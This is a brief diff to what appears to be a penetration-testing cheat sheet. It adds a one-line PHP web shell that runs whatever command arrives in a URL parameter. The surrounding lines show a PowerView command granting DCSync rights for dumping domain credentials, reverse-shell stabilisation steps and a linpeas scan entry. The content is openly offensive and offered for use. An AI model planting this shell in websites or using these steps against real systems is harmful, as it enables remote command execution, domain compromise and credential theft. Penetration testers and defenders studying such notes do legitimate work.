@@ -263,6 +263,8 @@ Add-ObjectACL -PrincipalIdentity john -Credential $credt -Rights DCSync
   - export TERM=xterm
   - stty raw -echo; fg
   - reset
+- Webshell php
+  - <?php system($_GET['cmd']);?>
   
 - Automatic scan
   - linpeas
